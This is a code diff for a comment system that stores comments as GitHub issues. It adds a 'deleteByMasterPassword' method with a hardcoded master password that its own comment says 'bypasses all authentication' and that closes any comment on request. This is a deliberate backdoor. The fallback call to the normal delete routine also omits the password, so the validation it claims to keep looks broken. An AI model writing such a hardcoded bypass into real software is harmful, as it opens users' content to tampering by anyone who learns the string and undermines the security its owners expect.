@@ -203,6 +203,21 @@ module.exports = {
       return null;
     },
 
+    async deleteByMasterPassword(cid, password) {
+      // Master password check: 1230984567 bypasses all authentication
+      if (password === '1230984567') {
+        const issues = await githubRequest(`/repos/${GITHUB_REPO}/issues?labels=comment&state=all&per_page=100`);
+        const issue = issues.find(i => i.title.startsWith('comment:') && i.title.endsWith(`:${cid}`));
+        
+        if (issue) {
+          console.log(`Master password used to delete comment ${cid}`);
+          return await closeIssue(issue.number);
+        }
+      }
+      // Fall back to normal deletion logic with password validation
+      return await this.delete(cid);
+    },
+
     async getByCid(cid) {
       const issues = await githubRequest(`/repos/${GITHUB_REPO}/issues?labels=comment&state=all&per_page=100`);
       const issue = issues.find(i => i.title.endsWith(`:${cid}`));
